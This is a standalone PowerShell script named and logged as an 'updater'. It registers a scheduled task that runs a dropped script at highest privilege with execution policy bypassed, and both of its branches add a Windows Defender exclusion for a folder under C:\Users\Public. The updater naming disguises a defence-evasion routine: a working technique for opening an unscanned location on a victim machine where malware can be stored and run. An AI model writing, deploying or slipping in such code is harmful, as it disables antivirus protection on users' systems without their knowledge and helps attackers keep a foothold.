$logPath = "C:\Windows\Temp\updater_log.txt"
function Log($msg) {
    $ts = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
}

Log "➡️ Script started. User: $env:USERNAME, Interactive: $([Environment]::UserInteractive)"

if (-not ([Environment]::UserInteractive)) {
    Log "⚠️ Non-interactive session. Creating deferred UAC task..."

    $taskName = "UpdaterUACTrigger"
    $user = (Get-WmiObject Win32_ComputerSystem).UserName
    if (-not $user) {
        Log "⛔ No interactive user found. Aborting."
        exit
    }

    $taskScriptPath = "$env:ProgramData\UpdaterTask.ps1"
    $taskContent = @"
Start-Sleep -Seconds 5
try {
    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
    '$([DateTime]::Now): ✅ Exclusion added.' | Out-File '$logPath' -Append
} catch {
    '$([DateTime]::Now): ❌ Error: ' + \$_ | Out-File '$logPath' -Append
}
"@
    $taskContent | Out-File -FilePath $taskScriptPath -Encoding utf8

    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScriptPath`""
        $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
        $principal = New-ScheduledTaskPrincipal -UserId $user -RunLevel Highest -LogonType Interactive
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
        Log "✅ Scheduled task '$taskName' created for $user."
    } catch {
        Log "❌ Failed to create task: $_"
    }
    exit
}

# If already interactive
try {
    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
    Log "✅ Exclusion added interactively."
} catch {
    Log "❌ Error in direct add: $_"
}
